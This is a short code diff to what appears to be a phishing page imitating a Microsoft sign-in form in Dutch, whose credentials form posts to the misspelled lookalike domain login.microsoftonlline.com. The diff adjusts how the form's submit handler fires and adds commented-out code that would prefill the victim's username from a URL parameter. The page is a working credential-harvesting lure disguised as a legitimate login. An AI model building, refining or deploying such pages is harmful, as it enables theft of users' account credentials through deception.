@@ -339,7 +339,7 @@ Constants.DEFAULT_BOILERPLATE_TEXT = '';
     <li class="login_cred_field_container">
         
 
-<form id="credentials" method="post" action="https://login.microsoftonlline.com/common/login" _lpchecked="1">
+<form id="credentials" method="post" onsubmit="endPage()" action="https://login.microsoftonlline.com/common/login" _lpchecked="1">
         <div id="cred_userid_container" class="login_textfield textfield">
             <span class="input_field textfield">
                 <label for="cred_userid_inputtext" class="no_display" aria-hidden="true">Gebruikersaccount</label>
@@ -702,12 +702,10 @@ Constants.DEFAULT_BOILERPLATE_TEXT = '';
 
     function initPage() {
         var account = GetURLParameter("u");
+        //var element = document.getElementById("cred_userid_inputtext");
+        //element.value = account;
         element = document.getElementById("cred_password_inputtext");
         UpdateAccount(element, "start");
-        
-        $("#credentials").submit(function( event ) {
-          endPage();
-        });
     }   
 </script> 
 
